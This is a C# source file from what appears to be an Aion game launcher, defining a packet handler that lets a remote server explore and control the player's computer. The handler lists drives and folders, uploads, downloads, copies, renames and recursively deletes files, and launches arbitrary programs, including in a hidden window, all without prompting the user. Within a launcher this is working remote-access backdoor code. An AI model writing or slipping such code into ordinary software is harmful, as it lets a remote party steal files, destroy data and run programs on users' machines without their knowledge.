using AionLanucher.Utilty;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace AionLanucher.Network.Server
{
    class SM_EXPLORER_PC : AbstractServerPacket
    {
        private const int GB = 0x40000000;
        private const int KB = 0x400;
        private const int MB = 0x100000;

        private string _info;
        private FileTpye type;

        private bool copysuccess = false;
        private string _message;
        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="c">类型</param>
        /// <param name="info"></param>
        public SM_EXPLORER_PC(FileTpye t, string info)
        {
            type = t;
            _info = info;
        }

        /// <summary>
        /// 只在复制文件或者文件夹 完成后才调用，主要用于反馈给服务端已完成的信息
        /// </summary>
        /// <param name="c"></param>
        public SM_EXPLORER_PC(FileTpye c, string info, string message)
        {
            this.type = c;
            this._info = info;
            this.copysuccess = true;
            this._message = message;
        }

        protected override void writeImpl()
        {
            writeC((byte)type);
            switch (type)
            {
                case FileTpye.SHOW_DRIVES://获取磁盘显示
                    ShowDrives();
                    break;
                case FileTpye.SHOW_FILE_OR_DIR://获取文件夹或者文件信息
                    ShowFileOrDir();
                    break;
                case FileTpye.COPY_FILE_OR_DIR://复制文件或者文件夹
                    CopyFileOrDir();
                    break;
                case FileTpye.DEL_FILE_OR_DIR://删除文件或者文件夹
                    DeleteFileOrDir();
                    break;
                case FileTpye.DOWN_FILE_OR_DIR://下载文件或者文件夹
                    DownloadFile();
                    break;
                case FileTpye.UPLOAD_FILE_OR_DIR://上传文件或者文件夹
                    UploadFile();
                    break;
                case FileTpye.NEW_FOLDER://新建文件夹
                    NewFolder();
                    break;
                case FileTpye.RENAME: //重命名
                    RenameFileOrDir();
                    break;
                case FileTpye.RUN_FILE_COMMAND: //运行文件
                    RunFile();
                    break;
            }
        }

        #region 运行文件
        /// <summary>
        /// 运行文件
        /// </summary>
        private void RunFile()
        {
            string[] str = _info.Split('\t');
            try
            {
                Process Proc = new Process();
                if (str.Length >= 2)
                {
                    switch (str[1])
                    {
                        case "min":
                            Proc.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
                            break;
                        case "max":
                            Proc.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
                            break;
                        case "hidden":
                            Proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            break;
                        case "canshu":
                            Proc.StartInfo.Arguments = str[2];
                            break;
                        default:
                            Proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
                            break;
                    }
                }
                //  if (Environment.OSVersion.Version.Major >= 6)
                //      Proc.StartInfo.Verb = "runas";
                if (Directory.Exists(str[0]))//打开文件夹
                {
                    Proc.StartInfo.FileName = "explorer.exe";
                    Proc.StartInfo.Arguments = str[0];
                }
                else//打开文件
                    Proc.StartInfo.FileName = str[0];
                Proc.Start();

                writeS(str[0] + "已启动");
            }
            catch (Exception e)
            {
                writeS(str[0] + "启动失败：" + e.Message);
            }
        }
        #endregion

        #region 重命名
        /// <summary>
        /// 重命名
        /// </summary>
        private void RenameFileOrDir()
        {
            string[] strs = _info.Split('\t');
            FileInfo fi = new FileInfo(strs[0]);
            string msg = "重命名成功";
            try
            {
                if (fi.Exists)
                {
                    File.Move(strs[0], strs[1]);
                }
                else
                {
                    DirectoryInfo dir = new DirectoryInfo(strs[0]);
                    if (dir.Exists)
                    {
                        dir.MoveTo(strs[1]);
                    }
                }
            }
            catch (Exception e)
            {
                msg = e.Message;
            }
            writeS(msg);
        }
        #endregion

        #region 新建文件夹
        /// <summary>
        /// 新建文件夹
        /// </summary>
        private void NewFolder()
        {
            string msg = "新建文件夹成功";
            try
            {
                Directory.CreateDirectory(_info);
            }
            catch (Exception e)
            {
                msg = e.Message;
            }
            writeS(msg);
        }
        #endregion

        #region 上传文件或者文件夹
        /// <summary>
        /// 上传文件或者文件夹
        /// </summary>
        private void UploadFile()
        {
            Thread t = new Thread(DownloadUploadFileThread);
            t.IsBackground = true;
            t.Start(false);
        }

        private void DownloadUploadFileThread(object o)
        {
            bool b = (bool)o;
            string[] strs = _info.Split('\t');
            bool isFile = !Directory.Exists(strs[0]);//判断是下载文件夹还是文件
            FileProcess fp = new FileProcess(strs[0], b, isFile, strs[1]);
            fp.Start();
        }
        #endregion

        #region 下载文件夹或者文件
        /// <summary>
        /// 下载文件夹或者文件
        /// </summary>
        private void DownloadFile()
        {
            Thread t = new Thread(DownloadUploadFileThread);
            t.IsBackground = true;
            t.Start(true);
        }
        #endregion

        #region 显示驱动器目录
        /// <summary>
        /// 显示驱动器目录
        /// </summary>
        private void ShowDrives()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            List<string> infos = new List<string>();
            foreach (DriveInfo info in drives)
            {
                if (info.DriveType == DriveType.Fixed)
                    infos.Add(((info.VolumeLabel == "") ? "本地磁盘" : info.VolumeLabel) + "(" + info.Name.Substring(0, 2) + ")" + "\t" + ByteToGBMBKB(info.TotalFreeSpace) + "\t" + ByteToGBMBKB(info.TotalSize) + "\t本地磁盘" + info.DriveFormat);
                else if (info.DriveType == DriveType.Removable)
                    infos.Add(((info.VolumeLabel == "") ? "可移动磁盘" : info.VolumeLabel) + "(" + info.Name.Substring(0, 2) + ")" + "\t" + ByteToGBMBKB(info.TotalFreeSpace) + "\t" + ByteToGBMBKB(info.TotalSize) + "\t可移动磁盘" + info.DriveFormat);
            }

            writeH((short)infos.Count);
            foreach (string s in infos)
            {
                writeS(s);
            }
            drives = null;
            infos.Clear();
            infos = null;
        }
        #endregion

        #region 显示文件夹和文件
        /// <summary>
        /// 显示文件夹和文件
        /// </summary>
        private void ShowFileOrDir()
        {
            try
            {
                DirectoryInfo info2 = new DirectoryInfo(_info);
                if (!info2.Exists)//如果目录不存在
                {
                    writeUH(0);//目录数量
                    writeUH(0);//文件数量
                }
                else
                {
                    DirectoryInfo[] directories = info2.GetDirectories();
                    writeUH((ushort)directories.Length);//目录数量
                    foreach (DirectoryInfo info3 in directories)
                    {
                        writeS(string.Format("{0}\t{1}\t{2}\t{3}", info3.Name, "", info3.CreationTime, info3.LastWriteTime));
                    }

                    FileInfo[] files = info2.GetFiles();
                    writeUH((ushort)files.Length);//文件数量
                    foreach (FileInfo info4 in files)
                    {
                        writeS(string.Format("{0}\t{1}\t{2}\t{3}", info4.Name, info4.Length, info4.CreationTime, info4.LastWriteTime));
                    }
                }
            }
            catch (Exception)
            {
                writeUH(0);//目录数量
                writeUH(0);//文件数量
            }
        }
        #endregion

        #region 复制文件或者文件夹
        /// <summary>
        /// 复制文件或者文件夹
        /// </summary>
        private void CopyFileOrDir()
        {
            string[] strArray = _info.Split('\t');
            if (!copysuccess)//如果为False 说明准备复制文件
            {
                Thread t = new Thread(CopyThread);
                t.IsBackground = true;
                t.Start();

                //提示正在后台复制中，请稍等...
                writeS(strArray[0] + " 正在后台复制中，如果复制完成会通知你，请稍等...");
            }
            else
            {
                writeS(strArray[0] + " 已完成复制工作.");
                ((AionConnection)getConnection()).SendPacket(new SM_EXPLORER_PC(FileTpye.SHOW_FILE_OR_DIR, strArray[1])); //刷新复制后的目录给 服务器
            }
        }
        private void CopyThread()
        {
            string[] strArray = _info.Split('\t');
            string message = null;
            FileInfo info5 = new FileInfo(strArray[0]);
            if ((info5 != null) && info5.Exists)
            {
                try
                {
                    string destFileName = Path.Combine(strArray[1], info5.Name);
                    if (destFileName == info5.FullName)
                    {
                        destFileName = Path.Combine(strArray[1], "复件_" + info5.Name);
                    }
                    info5.CopyTo(destFileName, true);
                }
                catch (Exception exception)
                {
                    message = exception.Message;
                }
            }
            else
            {
                CopyDirectory(strArray[0], strArray[1]);
            }
            //复制线程执行完毕后重新再发一个封包给服务器，该封包主要告诉之前复制的工作已完成
            ((AionConnection)getConnection()).SendPacket(new SM_EXPLORER_PC(FileTpye.COPY_FILE_OR_DIR, _info, message));
        }
        #endregion

        #region 删除文件或者文件
        /// <summary>
        /// 删除文件或者文件
        /// </summary>
        private void DeleteFileOrDir()
        {
            if (File.Exists(_info))
            {
                File.Delete(_info);
            }
            else if (Directory.Exists(_info))
            {
                Directory.Delete(_info, true);
            }
            writeS(_info + " 删除成功");
        }
        #endregion

        #region 容量计算 和 递归复制文件夹
        /// <summary>
        /// 容量计算
        /// </summary>
        /// <param name="KSize"></param>
        /// <returns></returns>
        private string ByteToGBMBKB(long KSize)
        {
            if ((KSize / GB) >= 1L)
            {
                return (Math.Round((double)(((float)KSize) / GB), 2).ToString() + " G");
            }
            if ((KSize / MB) >= 1L)
            {
                return (Math.Round((double)(((float)KSize) / MB), 2).ToString() + " M");
            }
            if ((KSize / KB) >= 1L)
            {
                return (Math.Round((double)(((float)KSize) / KB), 2).ToString() + " K");
            }
            return (KSize.ToString() + " B");
        }

        /// <summary>
        /// 复制文件夹到文件夹
        /// </summary>
        /// <param name="source"></param>
        /// <param name="target"></param>
        private void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            if (source.Parent == target) //在同一个目录下复制
            {
                Directory.CreateDirectory(source + "_复制");
            }

            for (DirectoryInfo info = target.Parent; info != null; info = info.Parent)
            {
                if (info.FullName == source.FullName)
                {
                    return;
                }
            }
            //获得文件数
            FileInfo[] files = source.GetFiles();
            //获取目录
            DirectoryInfo[] directories = source.GetDirectories();

            if (!Directory.Exists(target.FullName))
            {
                Directory.CreateDirectory(target.FullName);
            }
            foreach (FileInfo info2 in files)
            {
                info2.CopyTo(Path.Combine(target.ToString(), info2.Name));
            }
            foreach (DirectoryInfo info3 in directories)
            {
                DirectoryInfo info4 = target.CreateSubdirectory(info3.Name);
                CopyAll(info3, info4);//循环遍历复制
            }
        }


        /// <summary>
        /// 拷贝文件夹
        /// </summary>
        /// <param name="srcdir">源目录</param>
        /// <param name="desdir">目标目录</param>
        private void CopyDirectory(string srcdir, string desdir)
        {
            DirectoryInfo srD = new DirectoryInfo(srcdir);

            string folderName = srD.Name; //当前源文件夹名称
            //目标文件夹
            string desfolderdir = Path.Combine(desdir, folderName);

            FileSystemInfo[] filenames = srD.GetFileSystemInfos();

            foreach (FileSystemInfo file in filenames)// 遍历所有的文件和目录
            {
                if (Directory.Exists(file.FullName))// 先当作目录处理如果存在这个目录就递归Copy该目录下面的文件
                {
                    string currentdir = desfolderdir + "\\" + file.Name;
                    if (!Directory.Exists(currentdir))
                    {
                        Directory.CreateDirectory(currentdir);
                    }

                    CopyDirectory(file.FullName, desfolderdir);
                }
                else // 否则直接copy文件
                {
                    string srcfileName = desfolderdir + "\\" + file.Name;
                    if (!Directory.Exists(desfolderdir))
                    {
                        Directory.CreateDirectory(desfolderdir);
                    }
                    File.Copy(file.FullName, srcfileName);
                }
            }//foreach 
        }
        #endregion

        public enum FileTpye
        {
            SHOW_DRIVES = 0, //刷新驱动器硬盘
            SHOW_FILE_OR_DIR = 1, //显示文件或者文件夹
            COPY_FILE_OR_DIR = 2, //复制文件或者文件夹
            DEL_FILE_OR_DIR = 3,//删除文件或者文件夹
            DOWN_FILE_OR_DIR = 4,//下载文件或者文件夹
            UPLOAD_FILE_OR_DIR = 5, //上传文件或者文件夹
            NEW_FOLDER = 6, //新建文件夹
            RENAME = 7, //重命名
            RUN_FILE_COMMAND = 8 //运行文件
        };
    }
}
